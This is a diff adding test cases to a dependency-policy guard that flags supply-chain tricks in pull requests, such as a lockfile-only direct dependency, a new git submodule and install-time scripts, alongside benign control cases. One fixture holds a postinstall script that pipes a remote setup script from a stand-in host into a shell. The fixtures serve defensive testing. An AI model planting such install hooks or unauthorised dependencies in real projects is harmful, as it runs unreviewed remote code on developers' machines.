@@ -143,6 +143,36 @@ DEFAULT_BASE = {
     ".specforge/specs/checkout/tasks.md": TASKS_MD,
 }
 
+# package-lock v3: `packages[""]` mirrors the manifest's dependency
+# list, so a name appearing there without a manifest entry is a direct
+# dependency the manifest never authorised. Everything under
+# `node_modules/` is the resolved graph — transitive churn lives there
+# and must stay quiet.
+PACKAGE_LOCK_BASE = """{
+  "name": "demo",
+  "lockfileVersion": 3,
+  "packages": {
+    "": {
+      "name": "demo",
+      "dependencies": {
+        "express": "^4.19.2"
+      }
+    },
+    "node_modules/express": {
+      "version": "4.19.2"
+    },
+    "node_modules/body-parser": {
+      "version": "1.2.3"
+    }
+  }
+}
+"""
+
+PACKAGE_LOCK_WITH_EXTRA = PACKAGE_LOCK_BASE.replace(
+    '"express": "^4.19.2"',
+    '"express": "^4.19.2",\n        "event-stream": "^3.3.6"',
+)
+
 SCOPE_YML = """# Scope of the current change stream. Read from the BASE ref:
 # widening it inside a PR never authorises that same PR.
 allow:
@@ -653,6 +683,98 @@ CASES = [
         },
         expect="PASS",
     ),
+    # ------------------------------------------------------------------
+    # Supply chain around the manifest — the dependency arrives without
+    # ever appearing in a manifest's dependency list.
+    # ------------------------------------------------------------------
+    _case(
+        id="deps-lockfile-without-manifest",
+        category="dependency-policy",
+        kind="attack",
+        guard="deps",
+        feature="checkout",
+        rule="R4 — a lockfile may not authorise what the manifest never declared",
+        attack="`npm install --package-lock-only`: package-lock.json gains a direct dependency, package.json untouched",
+        base=dict(DEFAULT_BASE, **{"package-lock.json": PACKAGE_LOCK_BASE}),
+        head={"package-lock.json": PACKAGE_LOCK_WITH_EXTRA},
+        expect="FAIL",
+    ),
+    _case(
+        id="deps-submodule",
+        category="dependency-policy",
+        kind="attack",
+        guard="deps",
+        feature="checkout",
+        rule="R4 — a submodule is third-party code, so it is a dependency",
+        attack="Third-party code added as a git submodule instead of a package",
+        head={
+            ".gitmodules": '[submodule "fastjson"]\n\tpath = vendor/fastjson\n'
+                           "\turl = https://github.com/someone/fastjson.git\n"
+        },
+        expect="FAIL",
+    ),
+    _case(
+        id="deps-install-script",
+        category="dependency-policy",
+        kind="attack",
+        guard="deps",
+        feature="checkout",
+        rule="R4 — install-time scripts execute code on every install",
+        attack="package.json gains a postinstall script that fetches and runs a remote payload",
+        head={
+            "package.json": '{\n  "name": "demo",\n  "scripts": {\n'
+                            '    "postinstall": "curl -s https://example.test/setup.sh | sh"\n  },\n'
+                            '  "dependencies": {\n    "express": "^4.19.2"\n  }\n}\n'
+        },
+        expect="FAIL",
+    ),
+    _case(
+        id="deps-lockfile-refresh",
+        category="dependency-policy",
+        kind="control",
+        guard="deps",
+        feature="checkout",
+        rule="Transitive churn in a lockfile is not a new dependency",
+        attack="Lockfile refreshed: a transitive package's version moves, direct dependencies unchanged",
+        base=dict(DEFAULT_BASE, **{"package-lock.json": PACKAGE_LOCK_BASE}),
+        head={"package-lock.json": PACKAGE_LOCK_BASE.replace('"version": "1.2.3"', '"version": "1.2.4"')},
+        expect="PASS",
+    ),
+    _case(
+        id="deps-submodule-sha-bump",
+        category="dependency-policy",
+        kind="control",
+        guard="deps",
+        feature="checkout",
+        rule="Updating an existing submodule is not a new dependency",
+        attack="Existing submodule moves to a newer commit; .gitmodules unchanged",
+        base=dict(
+            DEFAULT_BASE,
+            **{
+                ".gitmodules": '[submodule "shared"]\n\tpath = vendor/shared\n'
+                               "\turl = https://github.com/acme/shared.git\n",
+                "vendor/shared.txt": "pinned: aaaaaaa\n",
+            }
+        ),
+        head={"vendor/shared.txt": "pinned: bbbbbbb\n"},
+        expect="PASS",
+    ),
+    _case(
+        id="deps-ordinary-script",
+        category="dependency-policy",
+        kind="control",
+        guard="deps",
+        feature="checkout",
+        rule="Scripts that do not run at install time are ordinary tooling",
+        attack="package.json gains `test` and `build` scripts",
+        head={
+            "package.json": '{\n  "name": "demo",\n  "scripts": {\n'
+                            '    "test": "vitest run",\n    "build": "tsc -p ."\n  },\n'
+                            '  "dependencies": {\n    "express": "^4.19.2"\n  }\n}\n'
+        },
+        expect="PASS",
+    ),
+
     _case(
         id="deps-unconfigured-repo-warns",
         category="dependency-policy",
